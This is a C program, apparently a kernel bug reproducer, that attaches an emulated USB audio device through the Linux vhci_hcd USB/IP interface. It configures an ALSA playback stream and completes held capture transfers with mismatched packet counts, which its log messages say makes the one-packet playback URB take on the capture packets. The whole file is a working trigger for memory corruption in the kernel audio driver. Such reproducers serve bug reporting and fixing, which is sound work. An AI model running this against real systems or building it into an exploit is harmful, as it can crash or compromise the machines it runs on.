// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/types.h>
#include <linux/usb/ch9.h>
#include <sound/asound.h>

#define USBIP_CMD_SUBMIT	1
#define USBIP_CMD_UNLINK	2
#define USBIP_RET_SUBMIT	3
#define USBIP_RET_UNLINK	4

#define USBIP_DIR_OUT		0
#define USBIP_DIR_IN		1

struct usbip_header_basic {
	__u32 command;
	__u32 seqnum;
	__u32 devid;
	__u32 direction;
	__u32 ep;
} __attribute__((packed));

struct usbip_header_cmd_submit {
	__u32 transfer_flags;
	__s32 transfer_buffer_length;
	__s32 start_frame;
	__s32 number_of_packets;
	__s32 interval;
	unsigned char setup[8];
} __attribute__((packed));

struct usbip_header_ret_submit {
	__s32 status;
	__s32 actual_length;
	__s32 start_frame;
	__s32 number_of_packets;
	__s32 error_count;
	unsigned char pad[8];
} __attribute__((packed));

struct usbip_header_cmd_unlink {
	__u32 seqnum;
	unsigned char pad[24];
} __attribute__((packed));

struct usbip_header_ret_unlink {
	__s32 status;
	unsigned char pad[24];
} __attribute__((packed));

struct usbip_header {
	struct usbip_header_basic base;
	union {
		struct usbip_header_cmd_submit cmd_submit;
		struct usbip_header_ret_submit ret_submit;
		struct usbip_header_cmd_unlink cmd_unlink;
		struct usbip_header_ret_unlink ret_unlink;
	} u;
} __attribute__((packed));

struct usbip_iso_packet_descriptor {
	__u32 offset;
	__u32 length;
	__u32 actual_length;
	__u32 status;
} __attribute__((packed));

#define MAX_ISO 64
#define XBUF_SZ (64 * 1024)

static int sock = -1;
static int hostsock = -1;
static volatile int armed;

#define EP_ISO_OUT_ADDR	0x01
#define EP_ISO_IN_ADDR	0x82
#define EP_ISO_OUT_NUM	1
#define EP_ISO_IN_NUM	2

#define RATE		48000
#define SUBSLOT		2
#define CHANNELS	1
#define STRIDE		(SUBSLOT * CHANNELS)
#define PB_MAXP		144
#define CAP_MAXP	64
#define CAP_FRAMES	6
#define CAP_BYTES	(CAP_FRAMES * STRIDE)

static int read_all(int fd, void *buf, size_t n)
{
	size_t off = 0;
	while (off < n) {
		ssize_t r = read(fd, (char *)buf + off, n - off);
		if (r <= 0) {
			if (r < 0 && errno == EINTR)
				continue;
			return -1;
		}
		off += r;
	}
	return 0;
}

static int write_all(int fd, const void *buf, size_t n)
{
	size_t off = 0;
	while (off < n) {
		ssize_t r = write(fd, (const char *)buf + off, n - off);
		if (r <= 0) {
			if (r < 0 && errno == EINTR)
				continue;
			return -1;
		}
		off += r;
	}
	return 0;
}

static int send_ret_submit(__u32 seqnum, int status, const void *data,
			   int actual_length,
			   struct usbip_iso_packet_descriptor *iso, int np)
{
	struct usbip_header h;
	struct usbip_iso_packet_descriptor wire[MAX_ISO];
	int i;

	memset(&h, 0, sizeof(h));
	h.base.command   = htonl(USBIP_RET_SUBMIT);
	h.base.seqnum    = htonl(seqnum);
	h.u.ret_submit.status		 = htonl((__u32)status);
	h.u.ret_submit.actual_length	 = htonl((__u32)actual_length);
	h.u.ret_submit.number_of_packets = htonl((__u32)np);

	if (write_all(sock, &h, sizeof(h)) < 0)
		return -1;
	if (actual_length > 0 && data)
		if (write_all(sock, data, actual_length) < 0)
			return -1;
	if (np > 0) {
		for (i = 0; i < np; i++) {
			wire[i].offset	      = htonl(iso[i].offset);
			wire[i].length	      = htonl(iso[i].length);
			wire[i].actual_length = htonl(iso[i].actual_length);
			wire[i].status	      = htonl(iso[i].status);
		}
		if (write_all(sock, wire, np * sizeof(wire[0])) < 0)
			return -1;
	}
	return 0;
}

static int send_ret_unlink(__u32 seqnum, int status)
{
	struct usbip_header h;

	memset(&h, 0, sizeof(h));
	h.base.command = htonl(USBIP_RET_UNLINK);
	h.base.seqnum  = htonl(seqnum);
	h.u.ret_unlink.status = htonl((__u32)status);
	return write_all(sock, &h, sizeof(h));
}

#define CLOCK_ID	41
#define TERM_USB_IN	1
#define TERM_SPK_OUT	2
#define TERM_MIC_IN	3
#define TERM_USB_OUT	4

static const unsigned char dev_desc[18] = {
	18, USB_DT_DEVICE,
	0x00, 0x02,
	0xef, 0x02, 0x01,
	64,
	0x22, 0x11,
	0x44, 0x33,
	0x00, 0x01,
	0, 0, 0,
	1
};

static unsigned char config_buf[512];
static int config_len;

static void put_intf(unsigned char **p, unsigned char num, unsigned char alt,
		     unsigned char neps, unsigned char cls,
		     unsigned char sub, unsigned char proto)
{
	unsigned char *q = *p;
	q[0] = 9; q[1] = USB_DT_INTERFACE;
	q[2] = num; q[3] = alt; q[4] = neps;
	q[5] = cls; q[6] = sub; q[7] = proto; q[8] = 0;
	*p = q + 9;
}

static void put_ep(unsigned char **p, unsigned char addr, unsigned char attr,
		   unsigned short maxp, unsigned char interval)
{
	unsigned char *q = *p;
	q[0] = 7; q[1] = USB_DT_ENDPOINT;
	q[2] = addr; q[3] = attr;
	q[4] = maxp & 0xff; q[5] = (maxp >> 8) & 0xff;
	q[6] = interval;
	*p = q + 7;
}

static void put_cs_ep(unsigned char **p)
{
	unsigned char *q = *p;
	q[0] = 8; q[1] = 0x25 ; q[2] = 0x01 ;
	q[3] = 0x00;
	q[4] = 0x00;
	q[5] = 0x00;
	q[6] = 0x00; q[7] = 0x00;
	*p = q + 8;
}

static void put_as_general(unsigned char **p, unsigned char term_link)
{
	unsigned char *q = *p;
	q[0] = 16; q[1] = 0x24 ; q[2] = 0x01 ;
	q[3] = term_link;
	q[4] = 0x00;
	q[5] = 0x01;
	q[6] = 0x01; q[7] = 0; q[8] = 0; q[9] = 0;
	q[10] = CHANNELS;
	q[11] = 0; q[12] = 0; q[13] = 0; q[14] = 0;
	q[15] = 0;
	*p = q + 16;
}

static void put_fmt_type(unsigned char **p)
{
	unsigned char *q = *p;
	q[0] = 6; q[1] = 0x24; q[2] = 0x02 ;
	q[3] = 0x01;
	q[4] = SUBSLOT;
	q[5] = SUBSLOT * 8;
	*p = q + 6;
}

static void build_config(void)
{
	unsigned char *p = config_buf;
	unsigned char *ac_start;
	int ac_len;

	p[0] = 9; p[1] = USB_DT_CONFIG;
	p[2] = 0; p[3] = 0;
	p[4] = 3;
	p[5] = 1;
	p[6] = 0;
	p[7] = 0x80;
	p[8] = 50;
	p += 9;

	p[0] = 8; p[1] = USB_DT_INTERFACE_ASSOCIATION;
	p[2] = 0;
	p[3] = 3;
	p[4] = 0x01;
	p[5] = 0x00;
	p[6] = 0x20;
	p[7] = 0;
	p += 8;

	put_intf(&p, 0, 0, 0, 0x01, 0x01, 0x20);

	ac_start = p;

	p[0] = 9; p[1] = 0x24; p[2] = 0x01;
	p[3] = 0x00; p[4] = 0x02;
	p[5] = 0x08;
	p[6] = 0; p[7] = 0;
	p[8] = 0x00;
	p += 9;

	p[0] = 8; p[1] = 0x24; p[2] = 0x0a ;
	p[3] = CLOCK_ID;
	p[4] = 0x03;
	p[5] = 0x03;
	p[6] = 0x00;
	p[7] = 0x00;
	p += 8;

	p[0] = 17; p[1] = 0x24; p[2] = 0x02 ;
	p[3] = TERM_USB_IN;
	p[4] = 0x01; p[5] = 0x01;
	p[6] = 0x00;
	p[7] = CLOCK_ID;
	p[8] = CHANNELS;
	p[9] = 0; p[10] = 0; p[11] = 0; p[12] = 0;
	p[13] = 0;
	p[14] = 0; p[15] = 0;
	p[16] = 0;
	p += 17;

	p[0] = 12; p[1] = 0x24; p[2] = 0x03 ;
	p[3] = TERM_SPK_OUT;
	p[4] = 0x01; p[5] = 0x03;
	p[6] = 0x00;
	p[7] = TERM_USB_IN;
	p[8] = CLOCK_ID;
	p[9] = 0; p[10] = 0;
	p[11] = 0;
	p += 12;

	p[0] = 17; p[1] = 0x24; p[2] = 0x02;
	p[3] = TERM_MIC_IN;
	p[4] = 0x01; p[5] = 0x02;
	p[6] = 0x00;
	p[7] = CLOCK_ID;
	p[8] = CHANNELS;
	p[9] = 0; p[10] = 0; p[11] = 0; p[12] = 0;
	p[13] = 0;
	p[14] = 0; p[15] = 0;
	p[16] = 0;
	p += 17;

	p[0] = 12; p[1] = 0x24; p[2] = 0x03;
	p[3] = TERM_USB_OUT;
	p[4] = 0x01; p[5] = 0x01;
	p[6] = 0x00;
	p[7] = TERM_MIC_IN;
	p[8] = CLOCK_ID;
	p[9] = 0; p[10] = 0;
	p[11] = 0;
	p += 12;

	ac_len = p - ac_start;
	ac_start[6] = ac_len & 0xff;
	ac_start[7] = (ac_len >> 8) & 0xff;

	put_intf(&p, 1, 0, 0, 0x01, 0x02, 0x20);
	put_intf(&p, 1, 1, 1, 0x01, 0x02, 0x20);
	put_as_general(&p, TERM_USB_IN);
	put_fmt_type(&p);

	put_ep(&p, EP_ISO_OUT_ADDR, 0x01 | 0x04, PB_MAXP, 4);
	put_cs_ep(&p);

	put_intf(&p, 2, 0, 0, 0x01, 0x02, 0x20);
	put_intf(&p, 2, 1, 1, 0x01, 0x02, 0x20);
	put_as_general(&p, TERM_USB_OUT);
	put_fmt_type(&p);

	put_ep(&p, EP_ISO_IN_ADDR, 0x01 | 0x04 | 0x20, CAP_MAXP, 1);
	put_cs_ep(&p);

	config_len = p - config_buf;
	config_buf[2] = config_len & 0xff;
	config_buf[3] = (config_len >> 8) & 0xff;
}

#define STALL (-32)

static unsigned char cur_config, cur_alt[4];

static void handle_control(__u32 seqnum, const unsigned char *setup, int wlen)
{
	unsigned char bmreq = setup[0];
	unsigned char breq  = setup[1];
	unsigned short wval = setup[2] | (setup[3] << 8);
	unsigned short widx = setup[4] | (setup[5] << 8);
	unsigned char buf[256];
	int len = 0;

	memset(buf, 0, sizeof(buf));

	if ((bmreq & USB_TYPE_MASK) == USB_TYPE_CLASS) {
		unsigned char ctrl_sel = wval >> 8;

		if (!(bmreq & USB_DIR_IN)) {

			send_ret_submit(seqnum, 0, NULL, 0, NULL, 0);
			return;
		}
		if (breq == 0x02 ) {

			buf[0] = 1; buf[1] = 0;
			buf[2] = RATE & 0xff; buf[3] = (RATE >> 8) & 0xff;
			buf[4] = (RATE >> 16) & 0xff; buf[5] = (RATE >> 24) & 0xff;
			buf[6] = RATE & 0xff; buf[7] = (RATE >> 8) & 0xff;
			buf[8] = (RATE >> 16) & 0xff; buf[9] = (RATE >> 24) & 0xff;
			buf[10] = 0; buf[11] = 0; buf[12] = 0; buf[13] = 0;
			len = 14;
			goto reply;
		}
		if (breq == 0x01 ) {
			if (ctrl_sel == 0x01) {
				buf[0] = RATE & 0xff;
				buf[1] = (RATE >> 8) & 0xff;
				buf[2] = (RATE >> 16) & 0xff;
				buf[3] = (RATE >> 24) & 0xff;
				len = 4;
			} else if (ctrl_sel == 0x02) {
				buf[0] = 1;
				len = 1;
			} else {
				len = wlen > 8 ? 8 : wlen;
			}
			goto reply;
		}
		len = wlen > 8 ? 8 : wlen;
		goto reply;
	}

	if ((bmreq & USB_TYPE_MASK) != USB_TYPE_STANDARD) {
		send_ret_submit(seqnum, STALL, NULL, 0, NULL, 0);
		return;
	}

	switch (breq) {
	case USB_REQ_GET_DESCRIPTOR:
		switch (wval >> 8) {
		case USB_DT_DEVICE:
			memcpy(buf, dev_desc, sizeof(dev_desc));
			len = sizeof(dev_desc);
			break;
		case USB_DT_CONFIG:
			memcpy(buf, config_buf, config_len);
			len = config_len;
			break;
		case USB_DT_STRING:
			if ((wval & 0xff) == 0) {
				buf[0] = 4; buf[1] = USB_DT_STRING;
				buf[2] = 0x09; buf[3] = 0x04;
				len = 4;
			} else {
				buf[0] = 4; buf[1] = USB_DT_STRING;
				buf[2] = 'U'; buf[3] = 0;
				len = 4;
			}
			break;
		default:
			send_ret_submit(seqnum, STALL, NULL, 0, NULL, 0);
			return;
		}
		break;
	case USB_REQ_SET_ADDRESS:
		send_ret_submit(seqnum, 0, NULL, 0, NULL, 0);
		return;
	case USB_REQ_SET_CONFIGURATION:
		cur_config = wval & 0xff;
		send_ret_submit(seqnum, 0, NULL, 0, NULL, 0);
		return;
	case USB_REQ_SET_INTERFACE:
		if ((widx & 0xff) < 4)
			cur_alt[widx & 0xff] = wval & 0xff;
		send_ret_submit(seqnum, 0, NULL, 0, NULL, 0);
		return;
	case USB_REQ_GET_CONFIGURATION:
		buf[0] = cur_config;
		len = 1;
		break;
	case USB_REQ_GET_INTERFACE:
		buf[0] = (widx & 0xff) < 4 ? cur_alt[widx & 0xff] : 0;
		len = 1;
		break;
	case USB_REQ_GET_STATUS:
		buf[0] = 0; buf[1] = 0;
		len = 2;
		break;
	case USB_REQ_CLEAR_FEATURE:
	case USB_REQ_SET_FEATURE:
		send_ret_submit(seqnum, 0, NULL, 0, NULL, 0);
		return;
	default:
		send_ret_submit(seqnum, STALL, NULL, 0, NULL, 0);
		return;
	}

reply:
	if (len > wlen)
		len = wlen;
	send_ret_submit(seqnum, 0, buf, len, NULL, 0);
}

#define MAX_PENDING 32
struct pending {
	__u32 seqnum;
	int np;
	struct usbip_iso_packet_descriptor iso[MAX_ISO];
};
static struct pending pend[MAX_PENDING];
static int npend;
static int cap_completed;

static void complete_capture(__u32 seqnum,
			     struct usbip_iso_packet_descriptor *iso, int np)
{
	static unsigned char payload[MAX_ISO * 64];
	int i, total = 0;

	for (i = 0; i < np; i++) {
		unsigned int l = iso[i].length;

		if (l > CAP_BYTES)
			l = CAP_BYTES;
		iso[i].actual_length = l;
		iso[i].status = 0;
		total += l;
	}
	memset(payload, 0, total);
	if (!cap_completed) {
		cap_completed = 1;
		printf("[+] completing capture ISO IN urb: %d packets x %d bytes"
		       " -> in_ctx->packets = %d adopted by the 1-packet"
		       " playback URB\n", np, CAP_BYTES, np);
	}
	send_ret_submit(seqnum, 0, payload, total, iso, np);
}

static void flush_pending(void)
{
	int i;

	for (i = 0; i < npend; i++)
		complete_capture(pend[i].seqnum, pend[i].iso, pend[i].np);
	npend = 0;
}

static void *device_thread(void *arg)
{
	static unsigned char xbuf[XBUF_SZ];
	struct usbip_iso_packet_descriptor iso[MAX_ISO];
	struct usbip_iso_packet_descriptor wire[MAX_ISO];

	(void)arg;
	for (;;) {
		struct usbip_header h;
		struct pollfd pfd;
		__u32 cmd, seqnum, dir, ep;
		int len, np, i;

		pfd.fd = sock;
		pfd.events = POLLIN;
		if (poll(&pfd, 1, 20) == 0) {
			if (armed && npend)
				flush_pending();
			continue;
		}
		if (armed && npend)
			flush_pending();

		if (read_all(sock, &h, sizeof(h)) < 0) {
			printf("[-] device link closed\n");
			return NULL;
		}
		cmd    = ntohl(h.base.command);
		seqnum = ntohl(h.base.seqnum);
		dir    = ntohl(h.base.direction);
		ep     = ntohl(h.base.ep);

		if (cmd == USBIP_CMD_UNLINK) {
			send_ret_unlink(seqnum, -104 );
			continue;
		}
		if (cmd != USBIP_CMD_SUBMIT) {
			printf("[-] unknown command %u\n", cmd);
			return NULL;
		}

		len = (int)ntohl(h.u.cmd_submit.transfer_buffer_length);
		np  = (int)ntohl(h.u.cmd_submit.number_of_packets);
		if (np < 0 || np > MAX_ISO)
			np = 0;

		if (dir == USBIP_DIR_OUT && len > 0) {
			if (len > XBUF_SZ)
				return NULL;
			if (read_all(sock, xbuf, len) < 0)
				return NULL;
		}
		if (np > 0) {
			if (read_all(sock, wire, np * sizeof(wire[0])) < 0)
				return NULL;
			for (i = 0; i < np; i++) {
				iso[i].offset	     = ntohl(wire[i].offset);
				iso[i].length	     = ntohl(wire[i].length);
				iso[i].actual_length = ntohl(wire[i].actual_length);
				iso[i].status	     = ntohl(wire[i].status);
			}
		}

		if (ep == 0) {
			handle_control(seqnum, h.u.cmd_submit.setup, len);
			continue;
		}

		if (ep == EP_ISO_IN_NUM && dir == USBIP_DIR_IN) {

			if (!armed) {
				if (npend < MAX_PENDING) {
					pend[npend].seqnum = seqnum;
					pend[npend].np = np;
					memcpy(pend[npend].iso, iso,
					       np * sizeof(iso[0]));
					npend++;
				}
				continue;
			}
			complete_capture(seqnum, iso, np);
			continue;
		}

		if (ep == EP_ISO_OUT_NUM && dir == USBIP_DIR_OUT) {
			int total = 0;

			for (i = 0; i < np; i++) {
				iso[i].actual_length = iso[i].length;
				iso[i].status = 0;
				total += iso[i].length;
			}
			send_ret_submit(seqnum, 0, NULL, total, iso, np);
			continue;
		}

		send_ret_submit(seqnum, STALL, NULL, 0, NULL, 0);
	}
	return NULL;
}

static int vhci_attach(void)
{
	char cmd[64];
	int fd, n;

	fd = open("/sys/devices/platform/vhci_hcd.0/attach", O_WRONLY);
	if (fd < 0) {
		perror("[-] open vhci_hcd attach");
		return -1;
	}

	n = snprintf(cmd, sizeof(cmd), "%u %u %u %u", 0, hostsock, 1, 3);
	if (write(fd, cmd, n) < 0) {
		perror("[-] write vhci_hcd attach");
		close(fd);
		return -1;
	}
	close(fd);
	return 0;
}

static int wait_for_pcm(char *path, size_t n)
{
	struct stat st;
	int i, c;

	for (i = 0; i < 400; i++) {
		for (c = 0; c < 4; c++) {
			snprintf(path, n, "/dev/snd/pcmC%dD0p", c);
			if (stat(path, &st) == 0)
				return 0;
		}
		usleep(25000);
	}
	return -1;
}

static void trigger(const char *path)
{
	struct snd_pcm_hw_params *hw;
	struct snd_pcm_sw_params sw;
	int fd, i, ver = 0;

	fd = open(path, O_RDWR);
	if (fd < 0) {
		perror("[-] open pcm");
		return;
	}
	ioctl(fd, SNDRV_PCM_IOCTL_PVERSION, &ver);

	hw = calloc(1, sizeof(*hw));
	if (!hw) {
		close(fd);
		return;
	}
	for (i = 0; i < SNDRV_PCM_HW_PARAM_LAST_MASK -
			SNDRV_PCM_HW_PARAM_FIRST_MASK + 1; i++)
		memset(&hw->masks[i].bits, 0xff, sizeof(hw->masks[i].bits));
	for (i = 0; i < SNDRV_PCM_HW_PARAM_LAST_INTERVAL -
			SNDRV_PCM_HW_PARAM_FIRST_INTERVAL + 1; i++) {
		hw->intervals[i].min = 0;
		hw->intervals[i].max = ~0U;
	}
	hw->rmask = ~0U;
	hw->cmask = 0;
	hw->info = ~0U;

#define SET_MASK(p, v) do {						\
	int __i = (p) - SNDRV_PCM_HW_PARAM_FIRST_MASK;			\
	memset(&hw->masks[__i].bits, 0, sizeof(hw->masks[__i].bits));	\
	hw->masks[__i].bits[(v) >> 5] |= 1U << ((v) & 31);		\
} while (0)
#define SET_IVAL(p, v) do {						\
	int __i = (p) - SNDRV_PCM_HW_PARAM_FIRST_INTERVAL;		\
	hw->intervals[__i].min = (v);					\
	hw->intervals[__i].max = (v);					\
	hw->intervals[__i].openmin = 0;					\
	hw->intervals[__i].openmax = 0;					\
	hw->intervals[__i].integer = 1;					\
} while (0)

	SET_MASK(SNDRV_PCM_HW_PARAM_ACCESS, SNDRV_PCM_ACCESS_RW_INTERLEAVED);
	SET_MASK(SNDRV_PCM_HW_PARAM_FORMAT, SNDRV_PCM_FORMAT_S16_LE);
	SET_MASK(SNDRV_PCM_HW_PARAM_SUBFORMAT, SNDRV_PCM_SUBFORMAT_STD);
	SET_IVAL(SNDRV_PCM_HW_PARAM_CHANNELS, CHANNELS);
	SET_IVAL(SNDRV_PCM_HW_PARAM_RATE, RATE);
	SET_IVAL(SNDRV_PCM_HW_PARAM_PERIOD_SIZE, 1024);
	SET_IVAL(SNDRV_PCM_HW_PARAM_PERIODS, 4);

	if (ioctl(fd, SNDRV_PCM_IOCTL_HW_PARAMS, hw) < 0) {
		perror("[-] HW_PARAMS");
		free(hw);
		close(fd);
		return;
	}
	printf("[+] HW_PARAMS ok (48000/S16_LE/1ch, period 1024)\n");

	memset(&sw, 0, sizeof(sw));
	sw.tstamp_mode = SNDRV_PCM_TSTAMP_NONE;
	sw.period_step = 1;
	sw.avail_min = 1;
	sw.start_threshold = ~0UL;
	sw.stop_threshold = ~0UL;
	sw.boundary = 0x40000000;
	sw.proto = ver;
	if (ioctl(fd, SNDRV_PCM_IOCTL_SW_PARAMS, &sw) < 0)
		perror("[-] SW_PARAMS");

	{
		static unsigned char pcmbuf[4096 * STRIDE];
		struct snd_xferi xfer;

		memset(pcmbuf, 0x41, sizeof(pcmbuf));
		if (ioctl(fd, SNDRV_PCM_IOCTL_PREPARE, 0) < 0)
			perror("[-] PREPARE");
		else
			printf("[*] PREPARE ok -> endpoints started, capture"
			       " URBs submitted (held by the device)\n");

		xfer.result = 0;
		xfer.buf = pcmbuf;
		xfer.frames = 2048;
		if (ioctl(fd, SNDRV_PCM_IOCTL_WRITEI_FRAMES, &xfer) < 0)
			perror("[-] WRITEI");
	}

	if (ioctl(fd, SNDRV_PCM_IOCTL_START, 0) < 0)
		perror("[-] START");
	else
		printf("[*] START ok -> prepare_playback_urb installed\n");

	armed = 1;
	printf("[*] releasing capture URBs...\n");
	sleep(3);

	free(hw);
	close(fd);
}

int main(void)
{
	pthread_t th;
	int sv[2];
	char path[64];

	setvbuf(stdout, NULL, _IONBF, 0);
	build_config();
	printf("[*] UAC2 config descriptor: %d bytes\n", config_len);

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
		perror("[-] socketpair");
		return 1;
	}
	hostsock = sv[0];
	sock = sv[1];

	if (pthread_create(&th, NULL, device_thread, NULL) != 0) {
		perror("[-] pthread_create");
		return 1;
	}

	if (vhci_attach() < 0)
		return 1;
	printf("[+] attached emulated UAC2 device to vhci_hcd port 0\n");

	if (wait_for_pcm(path, sizeof(path)) < 0) {
		printf("[-] no ALSA playback node appeared\n");
		return 1;
	}
	printf("[+] ALSA playback node: %s\n", path);
	usleep(300000);

	trigger(path);

	printf("[*] done\n");
	sleep(2);
	return 0;
}
